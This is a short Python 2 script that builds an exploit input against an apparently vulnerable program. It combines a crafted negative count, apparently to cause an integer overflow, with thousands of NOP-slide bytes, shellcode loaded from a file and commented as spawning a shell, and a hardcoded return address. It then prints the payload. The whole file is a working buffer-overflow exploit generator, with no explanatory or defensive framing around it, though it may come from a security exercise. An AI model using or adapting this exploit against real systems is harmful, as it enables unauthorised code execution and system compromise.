import sys

shellfile = open("shellcode.bin","r")
shellcode = shellfile.read()

input_str = str(-268434541) + ","			#count
input_str = input_str + "\x90" * 8000			#NOP slides
input_str = input_str + shellcode			#shellcode to spawn shell
input_str = input_str + "\x90"*6583			#NOP slides
input_str = input_str + "\x88\xbd\xff\xff"		#return address
input_str = input_str + "\x90"*4 + "\xff\xff\xff\xff" 	#set count negative

print input_str
